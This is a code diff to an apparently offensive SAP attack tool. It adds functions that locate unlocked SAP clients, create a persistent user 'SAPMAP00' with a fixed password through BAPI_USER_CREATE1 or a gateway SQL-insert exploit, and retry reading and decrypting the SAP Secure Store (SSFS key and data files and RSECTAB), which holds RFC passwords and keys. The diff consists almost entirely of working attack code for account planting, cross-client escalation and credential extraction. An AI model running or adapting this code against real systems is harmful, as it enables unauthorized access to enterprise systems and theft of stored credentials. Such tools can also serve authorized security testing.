@@ -560,10 +560,130 @@ _ABAP_READ_RSECTAB = [
 
 
 # ---------------------------------------------------------------------------
+# Client fallback helpers
+# ---------------------------------------------------------------------------
+
+def _find_open_clients(node, creds) -> list:
+    """Find clients on this system where ABAP exec is allowed.
+
+    Reads T000 via RFC_READ_TABLE (works in any client) and returns
+    client numbers where CCCORACTIV is blank or '1' (changes allowed),
+    excluding the current client.
+    """
+    try:
+        clients = sapmap_rfc.get_client_roles(node, creds)
+        open_clients = []
+        for c in clients:
+            mandt = c.get("MANDT", "")
+            cccoractiv = c.get("CCCORACTIV", "")
+            if mandt == creds.client:
+                continue  # skip current (failed) client
+            # blank or "1" = changes allowed; "2"/"3" = locked
+            if cccoractiv in ("", "1"):
+                open_clients.append(mandt)
+        return open_clients
+    except Exception as e:
+        print(f"[-] {node.sid}: Could not read T000 for open clients: {e}")
+        return []
+
+
+def _ensure_user_in_client(node, current_creds, target_client, state=None):
+    """Ensure SAPMAP00 exists in target_client and return working Credentials.
+
+    Tries in order:
+      1. Check if SAPMAP00 already exists (test_connection)
+      2. Check node.created_users for an existing user in that client
+      3. Create via BAPI_USER_CREATE1 (if current user exists in target client)
+      4. Create via GW exploit (if gateway is vulnerable — SQL specifies MANDT)
+    """
+    from sapmap_config import SAPMAP_PASSWORD_ABAP
+    from sapmap_config import sapmap_username
+
+    username = sapmap_username(0)  # SAPMAP00
+    inst_nr = current_creds.instance_nr
+
+    # 1. Check if SAPMAP00 already works in target client
+    test_creds = Credentials(
+        username=username, password=SAPMAP_PASSWORD_ABAP,
+        client=target_client, instance_nr=inst_nr,
+    )
+    try:
+        if sapmap_rfc.test_connection(node, test_creds):
+            print(f"[+] {node.sid}: SAPMAP00 already exists in client {target_client}")
+            return test_creds
+    except Exception:
+        pass
+
+    # 2. Check node.created_users
+    for cu in node.created_users:
+        if cu.client == target_client:
+            cu_creds = Credentials(
+                username=cu.username, password=cu.password,
+                client=cu.client, instance_nr=cu.instance_nr,
+            )
+            try:
+                if sapmap_rfc.test_connection(node, cu_creds):
+                    print(f"[+] {node.sid}: Using existing user {cu.username} "
+                          f"in client {target_client}")
+                    return cu_creds
+            except Exception:
+                pass
+
+    # 3. Try BAPI_USER_CREATE1 — connect to target client with current user
+    #    (works if the same user exists in both clients)
+    try:
+        bapi_creds = Credentials(
+            username=current_creds.username, password=current_creds.password,
+            client=target_client, instance_nr=inst_nr,
+        )
+        result = sapmap_rfc.create_user_via_bapi(
+            node, username, SAPMAP_PASSWORD_ABAP, target_client, bapi_creds)
+        if result and result.get("success"):
+            print(f"[+] {node.sid}: Created SAPMAP00 in client {target_client} via BAPI")
+            if state:
+                from sapmap_models import CreatedUser
+                cu = CreatedUser(
+                    username=username, sid=node.sid, client=target_client,
+                    hostname=node.hostname or "", ip=node.ip or "",
+                    instance_nr=inst_nr, method="bapi_create",
+                    password=SAPMAP_PASSWORD_ABAP,
+                )
+                node.created_users.append(cu)
+                if hasattr(state, 'created_users'):
+                    state.created_users.append(cu)
+            return test_creds
+    except Exception as e:
+        print(f"[*] {node.sid}: BAPI user creation in client {target_client} "
+              f"failed: {e}")
+
+    # 4. Try GW exploit (SQL INSERTs with explicit MANDT)
+    if node.gw_vulnerable and state:
+        try:
+            import sapmap_exploit
+            cu = sapmap_exploit.create_user_gw_exploit(
+                node, state, client=target_client)
+            if cu:
+                print(f"[+] {node.sid}: Created user in client {target_client} "
+                      f"via GW exploit")
+                return Credentials(
+                    username=cu.username, password=cu.password,
+                    client=cu.client, instance_nr=cu.instance_nr,
+                    verified=True,
+                )
+        except Exception as e:
+            print(f"[*] {node.sid}: GW exploit user creation in client "
+                  f"{target_client} failed: {e}")
+
+    print(f"[-] {node.sid}: Could not obtain access to client {target_client}")
+    return None
+
+
+# ---------------------------------------------------------------------------
 # Main entry point: read RSECTAB and decrypt all rows
 # ---------------------------------------------------------------------------
 
-def download_and_decrypt(node, creds, key_hex: str = DEFAULT_KEY_HEX) -> list:
+def download_and_decrypt(node, creds, key_hex: str = DEFAULT_KEY_HEX,
+                         state=None) -> list:
     """
     Read and decrypt SAP Secure Store entries.
 
@@ -571,15 +691,22 @@ def download_and_decrypt(node, creds, key_hex: str = DEFAULT_KEY_HEX) -> list:
       1. Read SSFS files from OS filesystem (KEY + DAT) — handles individual keys
       2. Read RSECTAB via ABAP program — fallback for DB-backed secure stores
       3. Read RSECTAB via RFC_READ_TABLE — last resort
+      4. If ABAP exec is blocked in current client, auto-try alternative clients
 
     The SSFS key file is always read (if available) to support systems that use
     an individual encryption key instead of the default.
     """
     _require_crypto()
 
+    abap_blocked = False  # track if ABAP exec was blocked by SCC4
+
     # --- Step 1: Try to read SSFS files from OS ---
     print(f"[*] SecStore {node.sid}: reading SSFS files from OS filesystem...")
     key_bytes, dat_bytes = _read_ssfs_files_via_abap(node, creds)
+
+    # Detect "not permitted" error — SSFS read uses ABAP exec
+    if key_bytes is None and dat_bytes is None:
+        abap_blocked = True  # might be blocked, will confirm in step 2
 
     # Extract SSFS master key from KEY file (if available)
     ssfs_key = None
@@ -600,18 +727,11 @@ def download_and_decrypt(node, creds, key_hex: str = DEFAULT_KEY_HEX) -> list:
                 print(f"[+] SecStore {node.sid}: {len(ssfs_records)} records from SSFS DAT")
 
             # Look for the RSECTAB individual key inside the SSFS records.
-            # Decrypted record payload structure:
-            #   bytes 0-7:   random prefix
-            #   bytes 8-11:  value length (big-endian)
-            #   bytes 12-27: hash
-            #   bytes 28-31: prefix
-            #   bytes 32+:   value = version_byte(1) + key(24) + trailing
             for ident, data_hex in ssfs_records:
                 if ident.startswith("SECSTORE_DB/KEY/"):
                     raw = bytes.fromhex(data_hex)
                     if len(raw) >= 57:
                         val_len = int.from_bytes(raw[8:12], "big")
-                        # Value at offset 32: version(1) + key(24) + extra
                         candidate = raw[33:57]
                         if len(candidate) == 24:
                             actual_key_hex = candidate.hex()
@@ -620,10 +740,6 @@ def download_and_decrypt(node, creds, key_hex: str = DEFAULT_KEY_HEX) -> list:
                             if actual_key_hex != DEFAULT_KEY_HEX:
                                 print(f"[+] SecStore {node.sid}: key differs from default")
                     break
-
-            # The SSFS DAT itself doesn't contain the same records as RSECTAB
-            # (it stores PKI pins, PSE data, and the SECSTORE_DB key itself).
-            # We still need RSECTAB for the actual RFC passwords etc.
         except Exception as e:
             print(f"[-] SecStore {node.sid}: SSFS DAT parse error: {e}")
 
@@ -632,9 +748,60 @@ def download_and_decrypt(node, creds, key_hex: str = DEFAULT_KEY_HEX) -> list:
     rows = _read_rsectab_via_abap(node, creds)
 
     if rows is None:
+        abap_blocked = True
         print(f"[*] {node.sid} client {creds.client}: "
               f"ABAP exec unavailable, falling back to RFC_READ_TABLE")
         rows = _read_rsectab_via_rfc(node, creds)
+
+    # --- Step 2b: Client fallback if ABAP exec was blocked ---
+    if not rows and abap_blocked:
+        print(f"[*] {node.sid}: Client {creds.client} blocks ABAP exec, "
+              f"searching for open client...")
+        open_clients = _find_open_clients(node, creds)
+        if open_clients:
+            print(f"[*] {node.sid}: Open clients found: {', '.join(open_clients)}")
+            for alt_client in open_clients:
+                print(f"[*] {node.sid}: Trying client {alt_client}...")
+                alt_creds = _ensure_user_in_client(
+                    node, creds, alt_client, state)
+                if not alt_creds:
+                    continue
+
+                # Retry SSFS files with alternative client
+                if key_bytes is None:
+                    print(f"[*] {node.sid}: Retrying SSFS read via "
+                          f"client {alt_client}...")
+                    key_bytes, dat_bytes = _read_ssfs_files_via_abap(
+                        node, alt_creds)
+                    if key_bytes:
+                        try:
+                            ssfs_key = extract_ssfs_key(key_bytes)
+                        except Exception:
+                            pass
+                    if dat_bytes and ssfs_key:
+                        try:
+                            ssfs_records = parse_ssfs_dat(dat_bytes, ssfs_key)
+                            for ident, dhex in ssfs_records:
+                                if ident.startswith("SECSTORE_DB/KEY/"):
+                                    raw = bytes.fromhex(dhex)
+                                    if len(raw) >= 57:
+                                        candidate = raw[33:57]
+                                        if len(candidate) == 24:
+                                            actual_key_hex = candidate.hex()
+                                    break
+                        except Exception:
+                            pass
+
+                # Retry RSECTAB with alternative client
+                print(f"[*] {node.sid}: Retrying RSECTAB read via "
+                      f"client {alt_client}...")
+                rows = _read_rsectab_via_abap(node, alt_creds)
+                if rows:
+                    print(f"[+] {node.sid}: SecStore read succeeded via "
+                          f"client {alt_client}")
+                    break
+        else:
+            print(f"[-] {node.sid}: No open clients found in T000")
 
     if not rows:
         print(f"[-] {node.sid} client {creds.client}: SecStore no entries found")
